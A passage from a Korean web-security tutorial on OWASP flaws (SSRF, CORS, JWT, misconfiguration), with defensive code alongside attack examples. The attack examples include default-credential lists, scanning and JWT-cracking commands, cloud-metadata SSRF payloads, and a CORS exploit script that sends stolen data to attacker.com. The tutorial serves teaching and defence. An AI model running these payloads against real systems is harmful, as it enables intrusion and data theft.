Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
- HttpOnly: JavaScript에서 접근 불가 (XSS 방어)
- Secure: HTTPS에서만 전송
- SameSite: CSRF 방어
```

### 비밀번호 재설정 취약점
```
흔한 취약점:
1. 예측 가능한 토큰 (타임스탬프, 순차적 숫자)
2. 토큰 만료 없음
3. 이메일 없이 토큰만으로 재설정 가능
4. 계정 열거 (유효한 이메일이면 다른 응답)

방어:
- 암호학적으로 안전한 랜덤 토큰 (os.urandom(32))
- 짧은 만료 시간 (15분)
- 단일 사용 토큰
```

---

## A05: Security Misconfiguration

### 기본 설정의 위험성

기기나 서비스의 기본 자격증명(admin/admin, admin/password 등) 목록입니다. 배포 전에 반드시 변경해야 하는 보안 취약점입니다.

```bash
# 흔한 기본 자격 증명
admin:admin
admin:password
root:root
admin:123456

# 취약한 서버 설정 확인
# Apache 디렉토리 리스팅
curl http://target.com/uploads/  # 파일 목록 노출?

# 에러 메시지에 민감 정보 포함
curl http://target.com/page?id=abc
# → MySQL error: You have an error in your SQL syntax...
#   → DB 타입, 쿼리 구조 노출!

# 디버그 모드 활성화
curl http://target.com/
# → X-Powered-By: PHP/7.4.1
# → Server: Apache/2.4.49
# → 버전 정보로 알려진 취약점 공격 가능
```

### 방화벽/네트워크 설정
```bash
# 불필요한 포트 확인
nmap -sV --script=banner target.com

# 관리 인터페이스 노출 확인
nmap -p 8080,8443,9090,9200,27017 target.com
# 8080: Tomcat 관리자
# 9200: Elasticsearch (인증 없음!)
# 27017: MongoDB (인증 없음!)

# 기본 자격증명으로 관리 패널 접근 시도
curl http://target.com:9200/_cat/indices  # Elasticsearch DB 목록
curl http://target.com:27017/            # MongoDB
```

---

## A10: SSRF (Server Side Request Forgery)

### SSRF 원리

SSRF(Server-Side Request Forgery)는 서버가 공격자가 지정한 URL로 요청을 보내도록 유도하는 취약점입니다. AWS 메타데이터 서버(`169.254.169.254`)에 접근하거나 내부망 서비스를 프록시로 사용하는 공격이 대표적입니다.

```
서버가 사용자가 제공한 URL에 요청을 보낼 때 발생
→ 내부 네트워크 접근, 클라우드 메타데이터 접근 등

취약 코드 예시:
$url = $_GET['url'];
$content = file_get_contents($url);  // 서버가 임의 URL에 요청!
echo $content;

공격:
1. 내부 서비스 접근
   ?url=http://localhost:8080/admin
   ?url=http://192.168.1.1/admin

2. AWS 메타데이터 접근 (클라우드 환경 핵심!)
   ?url=http://169.254.169.254/latest/meta-data/
   ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

3. 포트 스캔
   ?url=http://localhost:22
   ?url=http://internal.server:3306
```

### SSRF 방어

SSRF(Server-Side Request Forgery)는 서버가 공격자가 지정한 URL로 요청을 보내도록 유도하는 취약점입니다. AWS 메타데이터 서버(`169.254.169.254`)에 접근하거나 내부망 서비스를 프록시로 사용하는 공격이 대표적입니다.

```python
#!/usr/bin/env python3
"""
SSRF 방어 유틸리티 — URL 검증 + 안전한 HTTP 요청 래퍼
DNS 리바인딩 방지를 위해 연결 전 IP 재검증 수행
"""
import ipaddress
import socket
import urllib.parse
from typing import Optional
import requests
from requests.adapters import HTTPAdapter


ALLOWED_SCHEMES = {"https", "http"}
# 화이트리스트 기반 허용 도메인 (실환경에서 반드시 설정)
ALLOWED_HOSTS: set[str] = {
    "api.example.com",
    "cdn.example.com",
    "storage.example.com",
}


class SSRFBlockedError(Exception):
    """SSRF 차단 시 발생하는 예외"""


def is_private_ip(ip_str: str) -> bool:
    """사설/루프백/링크로컬/멀티캐스트 IP 탐지"""
    try:
        ip = ipaddress.ip_address(ip_str)
        return (
            ip.is_private
            or ip.is_loopback
            or ip.is_link_local
            or ip.is_multicast
            or ip.is_reserved
            or str(ip) in ("0.0.0.0", "::")
        )
    except ValueError:
        return True  # 파싱 실패 → 차단


def validate_ssrf_url(url: str, use_whitelist: bool = True) -> str:
    """
    URL의 SSRF 안전성 검증.
    - 허용 스킴 확인
    - DNS 조회 후 IP 레인지 검증
    - (선택) 화이트리스트 기반 호스트 검증
    반환: 검증된 URL (실패 시 SSRFBlockedError)
    """
    parsed = urllib.parse.urlparse(url)

    if parsed.scheme not in ALLOWED_SCHEMES:
        raise SSRFBlockedError(f"허용되지 않은 스킴: {parsed.scheme}")

    hostname = parsed.hostname
    if not hostname:
        raise SSRFBlockedError("호스트명 없음")

    # 화이트리스트 검증
    if use_whitelist and hostname not in ALLOWED_HOSTS:
        raise SSRFBlockedError(f"화이트리스트 미등록 호스트: {hostname}")

    # DNS 조회 결과의 IP 검증 (DNS 리바인딩 방지)
    try:
        addr_infos = socket.getaddrinfo(hostname, parsed.port or 443,
                                        proto=socket.IPPROTO_TCP)
    except socket.gaierror as e:
        raise SSRFBlockedError(f"DNS 조회 실패: {e}") from e

    for *_, sockaddr in addr_infos:
        ip = sockaddr[0]
        if is_private_ip(ip):
            raise SSRFBlockedError(
                f"내부망 IP 접근 차단: {hostname} → {ip}"
            )

    return url


class SafeRequester:
    """SSRF 방어가 적용된 HTTP 클라이언트"""

    def __init__(self, timeout: float = 10.0, use_whitelist: bool = True) -> None:
        self.timeout = timeout
        self.use_whitelist = use_whitelist
        self._session = requests.Session()
        # 리다이렉트 비활성화 (리다이렉트로 내부망 우회 방지)
        self._session.max_redirects = 0

    def get(self, url: str, **kwargs) -> requests.Response:
        safe_url = validate_ssrf_url(url, self.use_whitelist)
        return self._session.get(safe_url, timeout=self.timeout,
                                 allow_redirects=False, **kwargs)

    def post(self, url: str, **kwargs) -> requests.Response:
        safe_url = validate_ssrf_url(url, self.use_whitelist)
        return self._session.post(safe_url, timeout=self.timeout,
                                  allow_redirects=False, **kwargs)


# ── 테스트 ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    requester = SafeRequester(use_whitelist=False)  # 화이트리스트 없이 IP만 검증

    test_cases = [
        "http://127.0.0.1/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://192.168.1.1/",
        "http://10.0.0.1:8080/",
        "file:///etc/passwd",
        "https://api.example.com/data",
    ]

    for url in test_cases:
        try:
            validated = validate_ssrf_url(url, use_whitelist=False)
            print(f"[허용] {url}")
        except SSRFBlockedError as e:
            print(f"[차단] {url}  →  {e}")
```

---

## 웹 해킹 실전 도구 정리

### Burp Suite 기본 사용

Burp Suite는 웹 애플리케이션 보안 테스트의 핵심 프록시 도구입니다. 브라우저와 서버 사이에서 HTTP 요청을 가로채고 수정하며, Intruder로 자동화 공격, Repeater로 요청 재전송 테스트를 수행합니다.

```
1. Proxy → Intercept 활성화
2. 브라우저 프록시: 127.0.0.1:8080
3. HTTP 트래픽 캡처 및 수정
4. Repeater: 요청 반복 전송 및 분석
5. Intruder: 자동화 공격 (브루트포스, 퍼징)
6. Scanner: 자동 취약점 스캔 (Pro 버전)
```

### Nikto (웹 서버 취약점 스캐너)

Nikto 웹 서버 취약점 스캐너로 알려진 취약점과 설정 오류를 탐지합니다. 빠른 웹 서버 초기 점검에 유용합니다.

```bash
nikto -h http://target.com
nikto -h http://target.com -p 8080
nikto -h http://target.com -ssl  # HTTPS
nikto -h http://target.com -output report.html -Format htm
```

### Gobuster (디렉토리/파일 열거)

Gobuster로 숨겨진 디렉토리와 파일을 브루트포스로 열거합니다. 워드리스트를 이용해 존재하는 경로를 빠르게 찾아냅니다.

```bash
# 디렉토리 열거
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# 파일 확장자 지정
gobuster dir -u http://target.com -w common.txt -x php,html,txt

# 서브도메인 열거
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 가상 호스트 열거
gobuster vhost -u http://target.com -w subdomains.txt
```

---

## CORS 취약점 (Cross-Origin Resource Sharing)

### CORS 오설정 탐지

CORS(Cross-Origin Resource Sharing) 헤더 설정 오류를 탐지합니다. Origin 헤더를 임의 값으로 변경해 응답을 확인합니다.

```bash
# CORS 헤더 확인
curl -H "Origin: https://evil.com" -I https://target.com/api/data

# 취약한 응답 예시
Access-Control-Allow-Origin: https://evil.com     # 공격자 도메인 반영
Access-Control-Allow-Credentials: true            # 쿠키 포함 허용
# → CORS + ACAO + ACAC = 민감 데이터 탈취 가능
```

### CORS 공격 익스플로잇

CORS 오설정을 이용한 공격자 사이트의 익스플로잇 페이지입니다. 피해자 브라우저에서 대상 API에 요청을 보내 민감한 데이터를 탈취합니다.

```html
<!-- 공격자 사이트에서 실행 -->
<script>
fetch('https://target.com/api/sensitive-data', {
  credentials: 'include'  // 피해자 쿠키 포함
})
.then(r => r.json())
.then(data => {
  // 민감 데이터를 공격자 서버로 전송
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>
```

### CORS 취약 패턴
```
1. Null Origin 허용
   Access-Control-Allow-Origin: null
   → 파일 기반 HTML이나 샌드박스 iframe에서 악용

2. 서브도메인 와일드카드 매칭 버그
   if (origin.endsWith('target.com')) → evil-target.com 도 허용!

3. Access-Control-Allow-Origin: * + 인증 정보
   와일드카드와 credentials는 함께 사용 불가 (브라우저 차단)
   → 단, 서버가 직접 origin을 복사하면 우회됨
```

### CORS 방어

허용된 Origin만 CORS 요청을 받도록 화이트리스트 기반으로 검증하는 코드입니다. 와일드카드(*) 사용을 피하고 명시적으로 도메인을 지정해야 합니다.

```python
# 화이트리스트 기반 CORS 검증
ALLOWED_ORIGINS = ['https://app.example.com', 'https://admin.example.com']

def cors_check(origin):
    if origin in ALLOWED_ORIGINS:
        return origin
    return None  # 허용하지 않음

# Flask 예시
from flask_cors import CORS
CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)
```

---

## JWT 보안 취약점

### JWT 검증 우회 패턴
```
1. alg:none 공격
   알고리즘을 "none"으로 설정하면 일부 라이브러리가 서명 검증 생략

2. RS256 → HS256 알고리즘 혼동
   서버의 RSA 공개키를 HMAC 비밀키로 오용

3. 약한 비밀키
   HS256 비밀키가 "secret", "password" 등이면 오프라인 브루트포스 가능

4. 토큰 무효화 실패
   로그아웃해도 서버가 토큰 블랙리스트 관리 안 하면 토큰 재사용 가능
```

### JWT 클레임 변조 탐지 실습

JWT(JSON Web Token)를 Base64 디코딩하여 헤더와 페이로드를 분석합니다. alg:none 공격이나 알고리즘 혼동 공격 여부를 확인합니다.

```bash
# 1. JWT 디코딩 (base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

# 2. jwt_tool로 취약점 테스트
python3 jwt_tool.py TOKEN -X a  # alg:none
python3 jwt_tool.py TOKEN -X s  # 서명 혼동
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt  # 비밀키 크랙

# 3. hashcat으로 HS256 비밀키 크랙
hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt
```

### JWT 안전한 구현

JWT를 안전하게 생성하고 검증하는 Python 코드입니다. 강력한 서명 알고리즘(RS256, HS256)을 사용하고 만료 시간을 반드시 설정합니다.

```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = secrets.token_hex(32)  # 충분히 긴 랜덤 키

# 토큰 발급
payload = {
    'sub': user_id,
    'iat': datetime.utcnow(),
    'exp': datetime.utcnow() + timedelta(hours=1),  # 만료 시간 설정
    'jti': str(uuid.uuid4())  # 고유 ID (재사용 방지)
}
token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')

# 토큰 검증 (알고리즘 명시 필수)
decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])  # 알고리즘 고정

# 로그아웃 시 토큰 블랙리스트 처리
redis_client.setex(f"blacklist:{jti}", 3600, "revoked")
```
